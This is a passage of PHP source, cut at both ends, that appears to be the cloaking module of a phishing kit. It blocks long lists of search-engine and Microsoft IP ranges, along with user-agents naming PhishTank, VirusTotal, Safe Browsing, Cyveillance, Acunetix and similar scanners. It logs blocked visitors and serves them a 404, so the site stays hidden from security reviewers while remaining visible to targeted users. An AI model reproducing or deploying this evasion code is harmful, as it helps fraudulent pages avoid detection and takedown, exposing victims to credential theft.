  "^46.4.120.*",
  "^107.178.194.*",
  "^198.60.236.*",
  "^217.74.103.*",
  "^92.103.69.*",
  "^217.74.103.*",
  "^66.211.160.86*",
  "^46.244.*.*",
  "^131.120.12.*",
  "^157.201.10.*",
  "^172.217.*.*",
  "^103.86.99.*",
  "^213.100.*.*",
  "^216.58.*.*",
  "^173.194.*.*",
  "^74.125.133.*",
  "^66.102.*.*",
  "^66.249.*.*",
  "^209.85.*.*",
  "^216.239.*.*",
  "^64.4.*.*",
  "^65.52.*.*",
  "^131.253.*.*",
  "^157.54.*.*",
  "^207.46.*.*",
  "^207.68.*.*",
  "^8.12.*.*",
  "^66.196.*.*",
  "^66.228.*.*",
  "^67.195.*.*",
  "^68.142.*.*",
  "^72.30.*.*",
  "^74.6.*.*",
  "^98.136.*.*",
  "^202.160.*.*",
  "^209.191.*.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^184.165.*.*",
  "^198.68.61.*",
  "^199.3.10.*",
  "^204.119.24.*",
  "^204.251.90.*",
  "^100.43.*.*",
  "^72.94.249.*",
  "^103.6.76.*",
  "^106.12.*.*",
  "^115.231.36.*",
  "^5.189.*.*",
  "^66.102.6.*",
  "^66.249.*.*",
  "^173.252.*.*",
  "^196.23.168.*",
  "^190.82.81.*",
  "^92.189.25.*",
  "^52.31.147.*",
  "^69.164.111.*",
  "^173.252.86.*",
  "^173.239.*.*",
  "^203.215.181.*",
  "^208.43.225.*",
  "^173.192.*.*",
  "^212.113.37.*",
  "^119.63.*.*",
  "^188.207.200.*",
  "^89.108.102.*",
  "^173.11.97.*",
  "^209.185.108.*",
  "^209.185.253.*",
  "^216.239.*.*",
  "^64.68.*.*",
  "^66.249.*.*",
  "^72.14.199.*",
  "^8.6.48.*",
  "^141.185.209.*",
  "^169.207.238.*",
  "^202.160.*.*",
  "^195.211.*.*",
  "^185.41.162.*",
  "^51.15.*.*",
  "^84.51.153.*",
  "^185.220.101.*",
  "^40.85.158.*",
  "^72.94.249.*",
  "^8.23.224.*",
  "^104.132.20.*",
  "^1.33.126.*",
  "^217.96.*.*",
  "^64.233.160.*",
  "^93.119.*.*",
  "^23.27.152.*",
  "^111.231.*.*",
  "^144.217.82.*",
  "^148.163.128.*",
  "^41.208.72.*",
  "^36.74.236.*",
  "^64.233.173.*",
  "^36.83.56.*",
  "^87.115.213.*",
  "^110.88.*.*",
  "^46.101.119.*",
  "^87.115.213.*",
  "^68.14.83.*",
  "^100.6.107.*",
  "^174.255.*.*",
  "^72.49.133.*",
  "^104.15.60.*",
  "^35.153.86.*",
  "^191.98.136.*",
  "^175.135.172.*",
  "^134.119.*.*",
  "^208.101.*.*",
  "^104.42.*.*",
  "^181.229.*.*",
  "^89.234.*.*",
  "^186.6.*.*",
  "^103.19.16.*",
  "^158.69.216.*",
  "^157.39.109.*",
  "^83.31.*.*",
  "^92.23.56.*",
  "^86.132.235.*",
  "^106.133.165.*",
  "^111.89.*.*",
  "^14.101.178.*",
  "^107.178.*.*",
  "^180.29.89.*",
  "^61.21.221.*",
  "^204.85.191.*",
  "^188.166.*.*",
  "^103.19.16.*",
  "^199.59.150.*",
  "^209.135.212.*",
  "^208.87.233.*",
  "^83.31.*.*",
  "^49.104.10.*",
  "^216.252.*.*",
  "^24.172.*.*",
  "^193.128.*.*",
  "^162.244.*.*",
  "^40.121.198.*",
  "^95.45.252.*",
  "^188.166.*.*",
  "^83.71.*.*",
  "^66.214.*.*",
  "^205.201.132.*",
  "^40.107.*.*",
  "^104.132.*.*",
  "^173.205.33.*",
  "^185.145.156.*",
  "^17.198.249.*",
  "^103.35.*.*",
  "^128.28.*.*",
  "^128.72.*.*",
  "^128.75.*.*",
  "^138.122.*.*",
  "^139.59.*.*",
  "^50.107.*.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^66.211.169.3",
  "^66.211.169.66",
  "^89.163.159.214",
  "^37.128.131.171",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^104.108.64.175",
  "104.83.233.198",
  "^173.194.116.102",
  "^173.194.112.*",
  "^65.55.206.154",
  "^193.221.113.53",
  "^208.76.45.53",
  "^208.84.*.*",
  "^207.46.8.167",
  "^65.54.188.110",
  "^207.46.8.199",
  "^134.170.2.199",
  "^65.55.92.152",
  "^65.54.188.94",
  "^65.55.37.104",
  "^65.55.92.168",
  "^65.55.37.120",
  "^65.55.33.119",
  "^65.55.92.184",
  "^65.54.188.126",
  "^65.55.37.88",
  "^65.55.37.88",
  "^65.55.92.136",
  "^207.46.8.199",
  "^65.55.92.168",
  "^65.54.188.94",
  "^65.55.33.119",
  "^65.55.37.104",
  "^65.54.188.110",
  "^65.55.37.72",
  "^65.55.92.152",
  "^207.46.8.167",
  "^65.55.33.135",
  "^134.170.2.199",
  "^65.55.85.12",
  "^173.194.116.149",
  "^216.58.211.37",
  "^89.163.159.214",
  "^64.233.*.*",
  "^66.102.*.*",
  "^66.249.*.*",
  "^216.239.*.*",
  "^216.33.229.163",
  "^64.233.173.*",
  "^64.68.90.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^54.228.218.117",
  "^54.228.218.*",
  "^185.28.20.243",
  "^185.28.20.*",
  "^217.16.26.166",
  "^217.16.26.*
           ^206.207.*.*",
  "^209.19.*.*",
  "^207.70.*.*",
  "^185.75.*.*",
  "^193.226.*.*",
  "^66.102.*.*",
  "^64.71.*.*",
  "^69.164.*.*",
  "^64.74.*.*",
  "^64.235.*.*",
  "^4.14.64.*.*",
  "^4.14.64.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^72.13.86.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^4.14.0.0",
  "^206.207.*.*",
  "^209.19.*.*",
  "^207.70.*.*",
  "^185.75.*.*",
  "^193.226.*.*",
  "^66.102.*.*",
  "^64.71.*.*",
  "^69.164.*.*",
  "^64.74.*.*",
  "^64.235.*.*",
  "^4.14.64.*.*",
  "^4.14.64.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^72.13.86.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^4.14.0.0",
  '^104.236.153.*',
  '^107.170.*.*',
  '^64.71.206.*',
  '^64.71.205.*',
  '^64.71.204.*',
  '^66.102.8.*',
  '^157.55.39.*',
  '^105.107.79.*',
  '^4.14.64.*',
  '^64.74.215.*',
  '^198.186.190.*',
  '^198.186.191.*',
  '^198.186.192.*',
  '^198.186.193.*',
  '^109.186.*.*',
  '^12.148.196.*',
  '^12.148.209.*',
  '^128.242.*.*',
  '^131.212.*.*',
  '^149.20.*.*',
  '^158.108.*.*',
  '^163.195.178.*',
  '^167.24.*.*',
  '^168.188.*.*',
  '^173.194.*.*',
  '^173.224.160.*',
  '^173.224.161.*',
  '^173.224.162.*',
  '^173.224.163.*',
  '^173.224.164.*',
  '^173.224.165.*',
  '^173.224.166.*',
  '^173.224.167.*',
  '^184.173.*.*',
  '^192.115.134.*',
  '^192.118.48.*',
  '^193.220.178.*',
  '^193.253.199.*',
  '^193.47.80.*',
  '^194.52.68.*',
  '^194.72.238.*',
  '^194.90.*.*',
  '^198.25.*.*',
  '^198.54.*.*',
  '^199.30.228.*',
  '^202.108.252.*',
  '^204.14.48.*',
  '^206.28.72.*',
  '^207.126.144.*',
  '^208.65.144.*',
  '^208.91.115.*',
  '^209.73.228.*',
  '^209.85.*.*',
  '^209.85.128.*',
  '^212.143.*.*',
  '^212.150.*.*',
  '^212.235.*.*',
  '^212.29.192.*',
  '^212.29.224.*',
  '^212.50.193.*',
  '^216.10.193.*',
  '^216.239.32.*',
  '^216.252.167.*',
  '^217.132.*.*',
  '^217.132.*.*',
  '^38.100.*.*',
  '^38.100.*.*',
  '^38.105.*.*',
  '^38.144.36.*',
  '^46.116.*.* ',
  '^50.7.*.*',
  '^50.97.*.*',
  '^54.176.*.*',
  '^62.116.207.*',
  '^62.90.*.*',
  '^64.106.213.*',
  '^64.124.14.*',
  '^64.18.*.*',
  '^64.233.160.*',
  '^64.27.2.*',
  '^64.37.103.*',
  '^64.62.136.*',
  '^64.62.175.*',
  '^66.102.*.*',
  '^66.102.*.*',
  '^66.135.200.*',
  '^66.150.14.*',
  '^66.205.64.*',
  '^66.207.120.*',
  '^66.221.*.*',
  '^66.249.*.*',
  '^67.15.*.*',
  '^67.209.128.*',
  '^68.65.53.71',
  '^69.61.12.*',
  '^69.65.*.*',
  '^72.14.192.*',
  '^72.14.192.*',
  '^74.125.*.*',
  '^74.125.*.*',
  '^74.125.*.*',
  '^81.161.59.*',
  '^82.166.*.*',
  '^85.250.*.*',
  '^85.64.*.*',
  '^89.138.*.*',
  '^89.138.*.*',
  '^91.103.66.*',
  '^93.172.*.*',
  "^81.161.59.*",
  "^66.135.200.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^91.103.66.*",
  "^208.91.115.*",
  "^199.30.228.*",
  "^66.102.*.*",
  "^104.236.153.*",
  "^65.55.85.12",
  "^66.211.169.3",
  "^66.211.169.66",
  "^89.163.159.214",
  "^37.128.131.171",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^104.108.64.175",
  "104.83.233.198",
  "^173.194.116.102",
  "^173.194.112.*",
  "^65.55.206.154",
  "^193.221.113.53",
  "^208.76.45.53",
  "^208.84.*.*",
  "^207.46.8.167",
  "^65.54.188.110",
  "^207.46.8.199",
  "^134.170.2.199",
  "^65.55.92.152",
  "^65.54.188.94",
  "^65.55.37.104",
  "^65.55.92.168",
  "^65.55.37.120",
  "^65.55.33.119",
  "^65.55.92.184",
  "^65.54.188.126",
  "^65.55.37.88",
  "^65.55.37.88",
  "^65.55.92.136",
  "^207.46.8.199",
  "^65.55.92.168",
  "^65.54.188.94",
  "^65.55.33.119",
  "^65.55.37.104",
  "^65.54.188.110",
  "^1.128.96.181",
  "^65.208.151.*",
  "^1.132.97.75",
  "^1.152.96.223",
  "^38.100.*.*",
  "^185.20.5.*",
  "^185.20.4.*",
  "^95.76.156.*",
  "^216.58.211.37",
  "^173.194.116.149",
  "^107.170.*.*",
  "^64.68.90.*",
  "^64.233.173.*",
  "^216.33.229.163",
  "^216.239.*.*",
  "^89.163.159.214",
  "^149.20.*.*",
  "^219.117.238.170",
  "^79.79.148.223",
  "^62.149.225.67",
  "^104.131.165.123",
  "^46.101.249.238",
  "^79.79.147.162",
  "^178.62.113.173",
  "^1.152.97.32",
  "^101.174.147.73",
  "27.54.62.91",
  "4.14.64.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^64.235.153.*",
  "^64.235.154.*",
  "^198.25.*.*",
  "^64.106.213.*",
  "54.228.218.117",
  "^54.228.218.*",
  "185.28.20.243",
  "^185.28.20.*",
  "217.16.26.166",
  "162.224.156.32",
  "^204.101.161.159",
  "^217.16.26.*",
  "^216.162.209.*",
  "^64.71.193.*",
  "^185.75.141.32",
  "^209.66.70.*",
  "^207.70.60.*",
  "^209.19.185.*",
  "^209.*",
  "^104.236.153.*",
  "^107.170.*.*",
  "^109.186.*.*",
  "^12.148.196.*",
  "^12.148.209.*",
  "^128.242.*.*",
  "^131.212.*.*",
  "^149.20.*.*",
  "^158.108.*.*",
  "^163.195.178.*",
  "^167.24.*.*",
  "^168.188.*.*",
  "^173.194.*.*",
  "^173.224.160.*",
  "^173.224.161.*",
  "^173.224.162.*",
  "^173.224.163.*",
  "^173.224.164.*",
  "^173.224.165.*",
  "^173.224.166.*",
  "^173.224.167.*",
  "^184.173.*.*",
  "^192.115.134.*",
  "^192.118.48.*",
  "^193.220.178.*",
  "^193.253.199.*",
  "^193.47.80.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^194.90.*.*",
  "^198.25.*.*",
  "^198.54.*.*",
  "^199.30.228.*",
  "^202.108.252.*",
  "^204.14.48.*",
  "^206.28.72.*",
  "^207.126.144.*",
  "^208.65.144.*",
  "^208.91.115.*",
  "^209.73.228.*",
  "^209.85.*.*",
  "^209.85.128.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.50.193.*",
  "^216.10.193.*",
  "^216.239.32.*",
  "^216.252.167.*",
  "^217.132.*.*",
  "^217.132.*.*",
  "^38.100.*.*",
  "^38.100.*.*",
  "^38.105.*.*",
  "^38.144.36.*",
  "^46.116.*.* ",
  "^50.7.*.*",
  "^50.97.*.*",
  "^54.176.*.*",
  "^62.116.207.*",
  "^62.90.*.*",
  "^64.106.213.*",
  "^64.124.14.*",
  "^64.18.*.*",
  "^64.233.160.*",
  "^64.27.2.*",
  "^64.37.103.*",
  "^64.62.136.*",
  "^64.62.175.*",
  "^66.102.*.*",
  "^66.102.*.*",
  "^66.135.200.*",
  "^66.150.14.*",
  "^66.205.64.*",
  "^66.207.120.*",
  "^66.221.*.*",
  "^66.249.*.*",
  "^67.15.*.*",
  "^67.209.128.*",
  "^68.65.53.71",
  "^69.61.12.*",
  "^69.65.*.*",
  "^72.14.192.*",
  "^72.14.192.*",
  "^74.125.*.*",
  "^74.125.*.*",
  "^74.125.*.*",
  "^81.161.59.*",
  "^82.166.*.*",
  "^85.250.*.*",
  "^85.64.*.*",
  "^89.138.*.*",
  "^89.138.*.*",
  "^91.103.66.*",
  "^93.172.*.*",
  "^95.76.156.*",
  "^64.71.*.*",
  "^203.188.221.*",
  "^209.19.186.231",
  "^206.207.80.*",
  "^209.19.*.*",
  "^206.80.*.*",
  "^207.80.*.*",
  "^207.70.60.*",
  "^108.210.106.*",
  "^173.14.18.*",
  "^52.90.*.*",
  "^35.172.115.*",
  "^54.164.*.*",
  "^222.154.252.*",
  "^195.211.23.*",
  "^13.57.36.*",
  "^210.55.200.*",
  "^42.112.8.*"
);

foreach ($ips as $ip) {
  if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {

    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Blacklist ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$dp = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
  "bot",
  "above",
  "google",
  "docomo",
  "mediapartners",
  "phantomjs",
  "lighthouse",
  "reverseshorturl",
  "samsung-sgh-e250",
  "softlayer",
  "amazonaws",
  "cyveillance",
  "crawler",
  "gsa-crawler",
  "phishtank",
  "dreamhost",
  "netpilot",
  "calyxinstitute",
  "tor-exit",
  "apache-httpclient",
  "lssrocketcrawler",
  "crawler",
  "urlredirectresolver",
  "jetbrains",
  "spam",
  "windows 95",
  "windows 98",
  "acunetix",
  "netsparker",
  "007ac9",
  "008",
  "Feedfetcher",
  "192.comagent",
  "200pleasebot",
  "360spider",
  "4seohuntbot",
  "50.nu",
  "a6-indexer",
  "admantx",
  "amznkassocbot",
  "aboundexbot",
  "aboutusbot",
  "abrave spider",
  "accelobot",
  "acoonbot",
  "addthis.com",
  "adsbot-google",
  "ahrefsbot",
  "alexabot",
  "amagit.com",
  "analytics",
  "antbot",
  "apercite",
  "aportworm",
  "EBAY",
  "CL0NA",
  "jabber",
  "ebay",
  "arabot",
  "hotmail!",
  "msn!",
  "baidu",
  "outlook!",
  "outlook",
  "msn",
  "duckduckbot",
  "hotmail",
  "go-http-client",
  "go-http-client/1.1",
  "trident",
  "presto",
  "virustotal",
  "unchaos",
  "dreampassport",
  "sygol",
  "nutch",
  "privoxy",
  "zipcommander",
  "neofonie",
  "abacho",
  "acoi",
  "acoon",
  "adaxas",
  "agada",
  "aladin",
  "alkaline",
  "amibot",
  "anonymizer",
  "aplix",
  "aspseek",
  "avant",
  "baboom",
  "anzwers",
  "anzwerscrawl",
  "crawlconvera",
  "del.icio.us",
  "camehttps",
  "annotate",
  "wapproxy",
  "translate",
  "feedfetcher",
  "ask24",
  "asked",
  "askaboutoil",
  "fangcrawl",
  "amzn_assoc",
  "bingpreview",
  "dr.web",
  "drweb",
  "bilbo",
  "blackwidow",
  "sogou",
  "sogou-test-spider",
  "exabot",
  "externalhit",
  "ia_archiver",
  "googletranslate",
  "translate",
  "proxy",
  "dalvik",
  "quicklook",
  "seamonkey",
  "sylera",
  "safebrowsing",
  "safesurfingwidget",
  "preview",
  "whatsapp",
  "telegram",
  "instagram",
  "zteopen",
  "icoreservice",
  "untrusted"

);
foreach ($blocked_words as $word2) {
  if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {

    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bad words ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$Bot = array(
  "abot",
  "dbot",
  "ebot",
  "hbot",
  "kbot",
  "lbot",
  "mbot",
  "nbot",
  "obot",
  "pbot",
  "rbot",
  "sbot",
  "tbot",
  "vbot",
  "ybot",
  "zbot",
  "bot.",
  "bot/",
  "_bot",
  ".bot",
  "/bot",
